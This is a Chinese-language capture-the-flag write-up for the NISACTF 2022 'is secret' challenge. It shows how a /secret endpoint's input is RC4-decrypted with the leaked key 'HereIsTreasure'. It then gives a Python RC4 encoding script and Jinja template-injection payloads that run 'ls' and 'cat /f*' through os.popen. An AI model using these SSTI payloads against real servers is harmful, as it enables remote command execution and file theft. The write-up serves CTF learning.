# [NISACTF 2022]is secret RC4加密执行SSTI

这里结合了加密 记录一下

首先获取

<img src="https://i-blog.csdnimg.cn/blog_migrate/296c6ba6dd04564561bcf0beb934f76a.png" alt="" style="max-height:133px; box-sizing:content-box;" />


啥都没得

扫一下目录



<img src="https://i-blog.csdnimg.cn/blog_migrate/9be28d59761ea700fdb8f3b9c5d38588.png" alt="" style="max-height:144px; box-sizing:content-box;" />


都看看

后面发现

```cobol
http://node5.anna.nssctf.cn:28378/secret
```

这个页面



<img src="https://i-blog.csdnimg.cn/blog_migrate/d03f3d595c14b99b68b3fd36a21e73be.png" alt="" style="max-height:116px; box-sizing:content-box;" />


Tell me 是不是就是传参 我们get传递一个看看

```cobol
http://node5.anna.nssctf.cn:28378/secret?secret={{49}}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/13fce5bf41a4140e8d7cabb05590c837.png" alt="" style="max-height:699px; box-sizing:content-box;" />


发生报错 出现了 框架 这里一看就是框架漏洞了

然后我们看看报错信息

因为经过测试 我们可以发现输入1 会回显其他字符 这里肯定说明存在加密



<img src="https://i-blog.csdnimg.cn/blog_migrate/4bc88478459f231ad5d70bb98edd3830.png" alt="" style="max-height:301px; box-sizing:content-box;" />


这里出现了 说明我们需要传递一个RC4的加密进去 并且密文为

```
HereIsTreasure
```

所以我们可以通过脚本来实现

```cobol
import base64
from urllib import parse
 
 
def rc4_main(key="init_key", message="init_message"):  # 返回加密后得内容
    s_box = rc4_init_sbox(key)
    crypt = str(rc4_excrypt(message, s_box))
    return crypt
 
 
def rc4_init_sbox(key):
    s_box = list(range(256))
    j = 0
    for i in range(256):
        j = (j + s_box[i] + ord(key[i % len(key)])) % 256
        s_box[i], s_box[j] = s_box[j], s_box[i]
    return s_box
 
 
def rc4_excrypt(plain, box):
    res = []
    i = j = 0
    for s in plain:
        i = (i + 1) % 256
        j = (j + box[i]) % 256
        box[i], box[j] = box[j], box[i]
        t = (box[i] + box[j]) % 256
        k = box[t]
        res.append(chr(ord(s) ^ k))
    cipher = "".join(res)
    return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))
 
 
key = "HereIsTreasure"  # 此处为密文
message = input("请输入明文:\n")
enc_base64 = rc4_main(key, message)
enc_init = str(base64.b64decode(enc_base64), 'utf-8')
enc_url = parse.quote(enc_init)
print("rc4加密后的url编码:" + enc_url)
# print("rc4加密后的base64编码"+enc_base64)
```

然后就可以进行正常的ssti了

```handlebars
{{lipsum.__globals__['os'].popen("ls").read()}}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/c5663ec6397895c834ed173e7533f858.png" alt="" style="max-height:150px; box-sizing:content-box;" />


然后我们直接cat f*即可

```handlebars
{{lipsum.__globals__['os'].popen("cat /f*").read()}}
```